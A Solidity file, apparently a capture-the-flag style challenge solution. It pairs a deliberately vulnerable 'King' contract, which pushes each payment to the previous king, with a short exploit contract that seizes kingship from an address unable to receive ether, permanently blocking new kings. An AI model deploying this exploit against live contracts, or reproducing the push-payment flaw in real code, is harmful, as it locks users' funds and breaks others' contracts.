pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
// we will just make a contract that doesn't receive 
// more funds, hence it won't be able to receive furthur
// funds -> no new king
contract expl {  
    function pwn(address payable addr) public payable {
        King king = King(addr);
        uint prize = king.prize();
        (bool result,) = addr.call{value: prize}("");
        require(result, "failed??");
    }
}
